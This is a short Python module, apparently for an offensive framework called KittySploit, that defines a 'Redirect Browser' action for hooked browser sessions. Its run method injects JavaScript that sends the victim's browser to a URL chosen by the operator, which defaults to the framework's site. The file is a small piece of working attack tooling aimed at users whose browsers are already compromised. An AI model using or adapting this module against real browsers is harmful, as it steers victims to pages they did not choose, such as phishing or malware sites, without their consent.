from kittysploit import *

class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Redirect Browser",
		"description": "Redirect browser victim to a URL",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}	
	
	url = OptString("https://kittysploit.com", "URL to redirect to", True)

	def run(self):
		return self.send_js(f"window.location.href = '{self.url}';")
